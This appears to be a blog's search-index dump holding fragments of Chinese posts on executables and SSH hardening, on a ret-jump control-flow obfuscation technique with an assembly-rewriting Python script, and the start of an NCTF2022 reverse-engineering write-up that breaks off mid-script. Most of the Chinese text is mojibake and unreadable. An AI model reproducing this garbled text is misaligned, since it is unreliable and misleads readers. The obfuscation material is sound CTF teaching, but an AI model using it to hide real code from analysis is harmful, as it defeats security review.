å¯ç›´æ¥è¿è¡Œ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:1","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å¯æ‰§è¡Œæ–‡ä»¶çš„æ¥é¾™å»è„‰ Cæºä»£ç  â€”é¢„å¤„ç†ã€ç¼–è¯‘â€“\u003e æ±‡ç¼–ä»£ç  â€”æ±‡ç¼–ç¼–è¯‘â€”\u003e å¯é‡å®šå‘ç›®æ ‡æ–‡ä»¶ï¼ˆæœºå™¨ç ï¼‰ â€”é“¾æ¥â€”\u003e å¯æ‰§è¡Œæ–‡ä»¶ ç¼–è¯‘å·¥å…·é“¾ gccï¼ˆcppã€ccã€asã€ldï¼‰ï¼šç¼–è¯‘æºæ–‡ä»¶ make/cmakeï¼šæ‰¹é‡ç¼–å†™ç¼–è¯‘æŒ‡ä»¤ é™æ€é“¾æ¥/åŠ¨æ€é“¾æ¥ï¼Œé™æ€åº“(.a.lib)/åŠ¨æ€åº“(.so.dll) é™æ€é“¾æ¥ï¼šæŠŠåº“ä»£ç å…¨éƒ¨å†™å…¥å¯æ‰§è¡Œæ–‡ä»¶ åŠ¨æ€é“¾æ¥ï¼šåªå°†ä¸€äº›æ ‡è®°å†™å…¥å¯æ‰§è¡Œæ–‡ä»¶ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:2","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å¯æ‰§è¡Œæ–‡ä»¶å¦‚ä½•è¢«æ‰§è¡Œ æ“ä½œç³»ç»Ÿä¸ºå…¶åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹ï¼ˆprocessï¼‰ åŠ è½½å™¨ï¼ˆloaderï¼‰å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°æ–°è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ CPUæ‰§è¡Œæœºå™¨ç  ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:3","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å¯æ‰§è¡Œæ–‡ä»¶ä¸ºä½•æ— æ³•æ‰§è¡Œ CPUæ¶æ„ä¸åŒ x86ã€Armã€Risc-V æ— æ³•è¯†åˆ«å¼‚æ¶æ„æœºå™¨ç  æ“ä½œç³»ç»Ÿä¸åŒ winã€linuxã€mac æ— æ³•è£…è½½å¯æ‰§è¡Œæ–‡ä»¶ã€åº“ä¸åŒã€ç³»ç»Ÿè°ƒç”¨ä¸åŒ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:4","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#ç¡¬è¦æ‰§è¡Œæ€ä¹ˆåŠ è™šæ‹Ÿç¯å¢ƒ(è™šæ‹Ÿæœºã€wsl2)ï¼šå¼€é”€å¤§ã€ä½†å‡†ç¡®ç‡é«˜ è¾…åŠ©è£…è½½ã€æŒ‡ä»¤ç¿»è¯‘(wineã€wsl1)ï¼šå¼€é”€å°ã€ä½†é”™è¯¯å¤š ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:5","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#é¢˜å¤–è¯â€“ä»å¯æ‰§è¡Œæ–‡ä»¶çœ‹è·¨å¹³å°è§£å†³æ–¹æ¡ˆ è®¡ç®—æœºé¢†åŸŸé—®é¢˜ç»å…¸è§£ï¼šåŠ ä¸€å±‚ vm(virtual machine)è¯­è¨€ pythonã€javaã€jsä¸æµè§ˆå™¨ç¯å¢ƒ vmè´Ÿè´£åœ¨ä¸åŒçš„å¹³å°ç»™CPUç¿»è¯‘æˆé€‚åˆçš„æŒ‡ä»¤ Qt(ä¸€ä¸ªC++åº“) ç¼–å†™ä»£ç æ—¶ä½¿ç”¨Qtç»Ÿä¸€å°è£…çš„åº“ä»£æ›¿æŸç§ç³»ç»Ÿçš„ç‰¹å®šåº“ åœ¨è¿›è¡Œæ™®é€šçš„Cä»£ç ç¼–è¯‘ä¹‹å‰ï¼ŒQtå…ˆå°†Qtçš„åº“æ›¿æ¢æˆç‰¹å®šç³»ç»Ÿéœ€è¦çš„ç‰¹å®šåº“ ä¸€å¥—ä»£ç ã€å¤šæ¬¡ç¼–è¯‘ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:6","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"sshç›¸å…³ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:0","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#åŸºæœ¬æ¦‚å¿µ sshï¼šæ˜¯ä¸€å¥—ç½‘ç»œåè®®ï¼Œç”¨äºå®‰å…¨çš„ç½‘ç»œæœåŠ¡å’ŒåŠ å¯†è¿œç¨‹ç™»å½• opensshï¼šæ˜¯å®ç°sshåè®®çš„ä¸»æµå¼€æºè½¯ä»¶ linuxæœºå™¨ä¸Šçš„sshå‘½ä»¤ï¼šç”¨äºè¿æ¥è¿œç¨‹æœåŠ¡å™¨çš„å‘½ä»¤è¡Œç¨‹åº sshdï¼šæ˜¯sshæœåŠ¡ç«¯çš„åå°å®ˆæŠ¤ç¨‹åº åŸºæœ¬å‘½ä»¤ï¼šssh user@ip -p port ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:1","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å¦‚ä½•ä¿éšœç™»å½•æ—¶çš„å®‰å…¨æ€§ ä¸èƒ½æ˜æ–‡ä¼ è¾“å£ä»¤/æ•°æ® ä¿è¯å¯†é’¥äº¤æ¢çš„å®‰å…¨æ€§ å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äº’ç›¸èº«ä»½ç¡®è®¤ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:2","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å…³äºéå¯¹ç§°åŠ å¯†ç®—æ³• å¯†é’¥æœ‰å…¬é’¥å’Œç§é’¥ä¹‹åˆ† æ˜æ–‡ç”¨å…¬é’¥åŠ å¯†å¾—åˆ°å¯†æ–‡ å¯†æ–‡ç”¨ç§é’¥è§£å¯†å¾—åˆ°æ˜æ–‡ å…¬é’¥å’Œç§é’¥æ˜¯ä¸€ä¸€é…å¯¹çš„ï¼Œåªæœ‰ç”¨å…¬é’¥å”¯ä¸€å¯¹åº”çš„ç§é’¥æ‰èƒ½è§£å¼€å¯†æ–‡ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:3","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#åŸºäºå£ä»¤çš„ç™»å½•éªŒè¯ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:4","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#åŸºäºå…¬é’¥çš„å…å¯†ç™»å½• å®¢æˆ·ç«¯ï¼ˆæœ¬åœ°ï¼‰ç”Ÿæˆå…¬ç§é’¥ï¼šssh-keygen -t ed25519 å…³äºåŠ å¯†æ–¹å¼çš„å¯¹æ¯” å°†å…¬é’¥å‘é€ç»™æœåŠ¡å™¨ï¼šssh-copy-id user@ip ä¿®æ”¹æœåŠ¡å™¨sshdé…ç½®ï¼Œå…è®¸å…¬é’¥ç™»å½•ï¼š \u003e sudo vim /etc/ssh/sshd_config \u003e æ‰¾åˆ° PubkeyAuthenticationé€‰é¡¹ï¼Œé…ç½®ä¸ºyesï¼Œå¹¶åˆ é™¤è¡Œæ³¨é‡Š # ä¿®æ”¹å®Œæˆåé‡å¯sshdæœåŠ¡ \u003e sudo systemctl restart sshd ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:5","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#å¯¹æœåŠ¡å™¨éªŒè¯é˜²æ­¢ä¸­é—´äººæ”»å‡» æ˜¯å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨èº«ä»½çš„éªŒè¯ï¼Œé˜²æ­¢ä¸­é—´äººæ‹¦æˆªæµé‡ï¼Œå‡å†’æœåŠ¡å™¨ ç¬¬ä¸€æ¬¡ä½¿ç”¨sshç™»å½•æœåŠ¡å™¨æ—¶ï¼Œéœ€è¦ä½ æ‰‹åŠ¨éªŒè¯æœåŠ¡å™¨æŒ‡çº¹ä¿¡æ¯ï¼š \u003e ssh dx3906@ip The authenticity of host 'ip (ip)' can't be established. ED25519 key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxx. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? æ­¤æ—¶å¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è®¡ç®—SHA256ï¼š \u003e ssh-keyscan -t ed25519 ip | ssh-keygen -lf - # ip:22 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 256 SHA256:xxxxxxxxxxxxx ip (ED25519) ä¸Šä¸‹ä¸¤ä¸ªSHA256ä¸€è‡´ï¼Œåˆ™å¯è¯æ˜ç¡®å®åœ¨ä¸æœåŠ¡å™¨é€šä¿¡ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:6","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#ä¸€äº›æœ‰ç”¨çš„é…ç½® å®¢æˆ·ç«¯è®¾ç½®ä¸»æœºåˆ«å æ¯æ¬¡è¿›è¡Œsshç™»å½•éƒ½è¦è¾“å…¥ssh user@ip -p portæœªå…æœ‰ç‚¹éº»çƒ¦ï¼Œå¯ä»¥é€šè¿‡é…ç½®ï½/.ssh/configç®€åŒ–å‘½ä»¤å†™æ³•ï¼Œé…ç½®è¯­æ³•å¦‚ä¸‹ï¼š Host my_vps User user Hostname ip Port port ä¹‹åå°±å¯ä»¥ä½¿ç”¨ssh my_vpsä»£æ›¿å…ˆå‰çš„å‘½ä»¤ æœåŠ¡ç«¯å®‰å…¨é…ç½® ä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼Œä¿å­˜ä¿®æ”¹å¹¶é‡å¯sshdæœåŠ¡sudo systemctl restart sshd ä¿®æ”¹æœåŠ¡ç«¯å£é˜²æ­¢çˆ†ç ´ äººäººéƒ½çŸ¥é“sshé»˜è®¤ç«¯å£ä¸º22ä¸”å¿…æœ‰ä¸€ä¸ªå«rootçš„ç”¨æˆ·Â ç¦æ­¢rootç™»å½• PermitRootLogin no ç¦æ­¢å¯†ç ç™»å½•ï¼ˆåªèƒ½ç”¨å…¬é’¥ç™»å½•ï¼‰ PasswordAuthentication no ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:2:7","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Binary"],"content":"å†™åœ¨å‰é¢ æƒ³æ³•æ¥è‡ªNCTF2022 cccchaé¢˜ç›® æ„Ÿè°¢Cynosureå¸ˆå‚…æ„¿æ„è·Ÿæˆ‘åˆ†äº«å‡ºé¢˜è„šæœ¬ ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:1:0","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"æ··æ·†çš„ç›®çš„ æƒ³è¦è¾¾åˆ°æ··æ·†çš„ç›®çš„ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½ï¼š æ··æ·†æ˜¯å¯¹æŠ—é™æ€åˆ†æçš„æœ‰æ•ˆæ‰‹æ®µï¼Œç»è¿‡æ··æ·†çš„ç¨‹åºä»å¯æ­£å¸¸è¿è¡Œ ç»è¿‡æ§åˆ¶æµæ··æ·†ï¼Œå¦‚IDAç­‰é€†å‘å·¥å…·å°†æ— æ³•æ­£ç¡®ç”Ÿæˆä¼ªä»£ç ï¼Œç»™é€†å‘å·¥ç¨‹å¸¦æ¥æå¤§å›°éš¾ ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:2:0","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"æ··æ·†çš„åŸç† è¦æƒ³è®©IDAæ— æ³•è¯†åˆ«æ§åˆ¶æµï¼Œæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨å¸¸è§„çš„jmpç³»åˆ—è·³è½¬ï¼Œè¿™é‡Œé‡‡ç”¨ä¿®æ”¹è¿”å›åœ°å€+retè·³è½¬çš„æ–¹å¼ï¼Œç›¸å…³æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š push rbx push rbx pushfq call $+5 pop rbx add rbx, 3Fh mov [rsp+16], rbx popfq pop rbx retn call $+5æ˜¯åŸåœ°callï¼Œä½†åŒæ—¶ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆå³pop rbxï¼‰çš„åœ°å€å‹å…¥æ ˆï¼Œæ­£å¸¸æ—¶ä½œä¸ºè°ƒç”¨ç»“æŸæ—¶çš„è¿”å›åœ°å€ã€‚ä½†ä¸‹ä¸€å¥pop rbxç›´æ¥å°†å…¶å–å‡ºæ”¾å…¥rbxï¼Œç´§æ¥ç€å¯¹rbxåŠ ä¸Šä¸€ä¸ªå€¼ï¼Œç„¶åè¦†ç›–rsp+16ã€‚åé¢ä¸¤å¥ä¸¤ä¸ªpopï¼Œæ¯æ¬¡rsp+8ï¼Œæ­£å¥½è®©åŸå…ˆrsp+16å¤„çš„å€¼ä½äºæ ˆé¡¶ã€‚æ­¤æ—¶æ‰§è¡Œretnï¼Œå°±ä¼šè·³è½¬åˆ°æ ˆé¡¶çš„è¿™ä¸ªåœ°å€ã€‚æ•´ä¸ªè¿‡ç¨‹ç”¨gdbè°ƒè¯•ä¸€ä¸‹ä¼šçœ‹å¾—æ›´æ¸…æ¥šã€‚ å¯¹äºcccchaè¿™é“é¢˜ï¼Œå¯å‚è€ƒç¬”è€…çš„ä¸Šä¸€ç¯‡WriteUpï¼Œè¯¦ç»†åœ°ä»‹ç»äº†æ··æ·†çš„åŸç†ä»¥åŠå»é™¤æ–¹æ³• ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:3:0","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"æ·»åŠ æ··æ·†çš„è¿‡ç¨‹ æ•´ä½“çš„æ€è·¯æ˜¯ï¼š å°†ç”¨cå†™å¥½çš„æºä»£ç å…ˆç¼–è¯‘æˆæ±‡ç¼– ç”¨pythonè„šæœ¬åœ¨æ±‡ç¼–ä¸­æ·»åŠ æ··æ·†æŒ‡ä»¤ ç¼–è¯‘æ±‡ç¼–æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ è¿™é‡Œç¬”è€…é¦–å…ˆç”¨Cè¯­è¨€å†™äº†ä¸€ä¸ªç®€å•çš„å¼‚æˆ–åŠ å¯†é€»è¾‘ï¼š #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { // char flag[] = \"flag{an_example_of_control_flow_obfuscation}\"; unsigned char key = 0x99; unsigned char enc[] = {255, 245, 248, 254, 226, 248, 247, 198, 252, 225, 248, 244, 233, 245, 252, 198, 246, 255, 198, 250, 246, 247, 237, 235, 246, 245, 198, 255, 245, 246, 238, 198, 246, 251, 255, 236, 234, 250, 248, 237, 240, 246, 247, 228}; unsigned char input[50]; scanf(\"%44s\", input); for(int i = 0; i \u003c 44; i++) { input[i] ^= key; if (input[i]!= enc[i]) { puts(\"wrong\"); exit(-1); } } puts(\"right\"); return 0; } ç„¶åé€šè¿‡gcc -S main.c -o main.så³å¯å¾—åˆ°æ±‡ç¼–æ–‡ä»¶ ä¸‹é¢é‡ç‚¹è¯´ä¸€ä¸‹pythonè„šæœ¬çš„å†…å®¹ï¼š ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:0","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"åœ¨æ¯ä¸€å¥æŒ‡ä»¤åæ·»åŠ jmpè·³è½¬ # è¯»å…¥æ±‡ç¼–æ–‡ä»¶ with open(\"main.s\", \"r\") as input: codes = input.read() codes = codes.split('\\n') # åˆ†å‰²æ¯ä¸€è¡Œæ±‡ç¼–ä»£ç  print(len(codes)) # æ·»åŠ jmpæŒ‡ä»¤ res = \"\" cnt = 1 for line in codes: if line == \"\": # ç©ºè¡Œç›´æ¥ç•¥è¿‡ continue elif line[-1] == ':' or line[0] == '.' or line[1] == '.': # éä»£ç è¡ŒåŸæ ·ä¸åŠ¨ res += '\\t' + line.strip() + '\\n' else: res += '\\t' + line.strip() res += \"jmp .ML{}\\n\".format(cnt) # æ·»åŠ jmpè·³è½¬ res += \".ML{}:\\n\".format(cnt) # æ·»åŠ è·³è½¬ç›®æ ‡æ ‡ç­¾ cnt += 1 with open(\"jmp.s\", \"w\") as output: # å†™å…¥jmp.sæ–‡ä»¶ output.write(res) æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç¼–è¯‘jmp.så¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç¡®å®šå¯ä»¥æ­£å¸¸è¿è¡Œ æ‹–åˆ°IDAé‡Œï¼Œé€šè¿‡CFGå¯ä»¥æ¸…æ™°åœ°çœ‹å‡ºï¼Œä»£ç ç¡®å®è¢«åˆ‡åˆ†æˆäº†ä¸€ä¸ªä¸ªå°éƒ¨åˆ† ä½†æ˜¯ä»ç„¶å¯ä»¥æ­£å¸¸åç¼–è¯‘å¾—åˆ°ä¼ªä»£ç ï¼Œä¸”ä¸ä¸æ·»åŠ jmpæŒ‡ä»¤å‡ ä¹æ— å·®åˆ«ï¼Œè¿™è¯´æ˜äº†IDAå¯ä»¥è½»æ˜“å¤„ç†jmpè¿™ç§æ˜¾å¼è·³è½¬ã€‚ ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:1","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"å°†jmpè·³è½¬æ›¿æ¢ä¸ºretè·³è½¬ # æŠŠjmpè·³è½¬æ›¿æ¢ä¸ºretè·³è½¬ codes = res.split('\\n') res_2 = \"\" jmp_count = 0 target_count = 1 for line in codes: if \"jmp .ML\" not in line: # éè·³è½¬æŒ‡ä»¤åŸæ ·ä¸åŠ¨ res_2 += line + '\\n' else: res_2 += f''' pushq %rbx pushq %rbx pushfq .byte 0xe8 .byte 0x00 .byte 0x00 .byte 0x00 .byte 0x00 .CALL_LAB_{jmp_count}: popq %rbx addq $(.ML{target_count} - .CALL_LAB_{jmp_count}),%rbx movq %rbx, 16(%rsp) popfq popq %rbx ret ''' jmp_count += 1 target_count += 1 with open(\"junk.s\", \"w\") as output: output.write(res_2) é€šè¿‡å°†jmpè·³è½¬æ›¿æ¢ï¼Œè·³è½¬æ•ˆæœä¸å˜ï¼Œç¼–è¯‘åè¿è¡Œå¯æ‰§è¡Œç¨‹åºåŠŸèƒ½æ­£å¸¸ ä½†æ­¤æ—¶å†ä½¿ç”¨IDAæ‰“å¼€ï¼Œä¼šå‘ç°å·²ç»æ— æ³•æ­£å¸¸åç¼–è¯‘ï¼Œä»£ç å—éƒ½æ˜¯ç ´ç¢çš„ã€æ‰¾ä¸åˆ°è”ç³»çš„ï¼Œä¹Ÿæ— æ³•è¿›è¡Œé™æ€åˆ†æ ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:2","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["Binary"],"content":"Moreâ€¦ å¦‚cccchaè¿™é“é¢˜ä¸­ä¸€æ ·ï¼Œä½ å¯ä»¥å‘å…¶ä¸­æ·»åŠ æ›´å¤šçš„èŠ±æŒ‡ä»¤ä½¿é—®é¢˜å˜å¾—æ›´å¤æ‚ï¼Œä¸”æ··æ·†æ›´ä¸å®¹æ˜“å»é™¤ ","date":"2022-12-14","objectID":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/:4:3","tags":["reverse","obfuscation"],"title":"retè·³è½¬çš„ç®€å•æ§åˆ¶æµæ··æ·†","uri":"/2022/12/%E5%88%A9%E7%94%A8%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8Cret%E8%B7%B3%E8%BD%AC%E7%9A%84%E7%AE%80%E5%8D%95%E6%8E%A7%E5%88%B6%E6%B5%81%E6%B7%B7%E6%B7%86/"},{"categories":["WriteUps"],"content":"ccccha é¢˜ç›®åœ°å€ï¼šhttps://github.com/X1cT34m/NCTF2022 è¿™é“é¢˜é‡ç‚¹åœ¨å»èŠ±/æ··æ·†ï¼Œå»å®Œä¹‹åæ˜¯ä¸ªchacha20å°±ä¸è¯´äº† èŠ±æŒ‡ä»¤å¤§è‡´å¯åˆ†ä¸ºä¸‰ç±»ï¼š ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:0","tags":["CTF","reverse"],"title":"NCTF2022 ccccha èŠ±æŒ‡ä»¤/æ··æ·† è¯¦è§£","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"1. pushå®Œå•¥ä¹Ÿæ²¡å¹²å°±pop push rax push rbx push rdx pop rdx pop rbx pop rax è§£å†³æ–¹æ¡ˆï¼šå…¨éƒ½nopæ‰ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š start = 